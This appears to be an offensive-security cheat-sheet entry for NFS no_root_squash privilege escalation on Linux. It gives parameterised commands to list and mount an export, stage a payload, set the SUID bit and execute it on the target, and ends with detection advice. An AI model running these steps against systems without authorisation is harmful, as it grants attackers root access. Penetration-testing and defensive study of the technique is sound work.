---
technique: NFS no_root_squash
category: privilege-escalation
targets: NFS Exports
protocols: NFS
remote_capable: true
tags: linux lpe nfs no-root-squash suid
---

# NFS no_root_squash

NFS exports with `no_root_squash` let remote root write files as root on the exported filesystem. If that path is mounted or executed on the target, a prepared SUID payload can become a local escalation path.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| NFS access | Export must be reachable from the operator host |
| no_root_squash | Export must preserve remote root ownership |
| Target execution | The target must execute or expose files from the export |

## Linux

### List NFS exports

#sh #nfs

List NFS exports on the target.

```sh title:"List NFS exports"
showmount -e "$rhost_ip"
```
<!-- cheat
var rhost_ip
-->

### Step 1: Create mount point

#sh #nfs

Create a local mount point.

```sh title:"Create NFS mount point"
mkdir -p "$mount_point"
```
<!-- cheat
var mount_point
-->

### Step 2: Mount NFS export

#sh #nfs

Mount the export locally with `nolock`.

```sh title:"Mount NFS export"
sudo mount -t nfs "$rhost_ip:$shared_folder" "$mount_point" -o nolock
```
<!-- cheat
var rhost_ip
var shared_folder
var mount_point
-->

### Step 3: Copy SUID payload

#sh #nfs

Copy a prepared payload into the mounted export.

```sh title:"Copy payload to NFS export"
sudo cp "$payload_file" "$mount_point/$payload_name"
```
<!-- cheat
var payload_file
var mount_point
var payload_name
-->

### Step 4: Set SUID bit

#sh #nfs #suid

Set root owner and SUID permissions on the staged payload.

```sh title:"Set SUID permissions on NFS payload"
sudo chmod 4755 "$mount_point/$payload_name"
```
<!-- cheat
var mount_point
var payload_name
-->

### Step 5: Execute payload on target

#sh #suid

Execute the payload from the target-side path.

```sh title:"Execute target-side NFS payload"
"$target_path/$payload_name"
```
<!-- cheat
var target_path
var payload_name
-->

## Detection

Monitor NFS exports for `no_root_squash`, root-owned files created remotely, and new SUID files in exported paths.
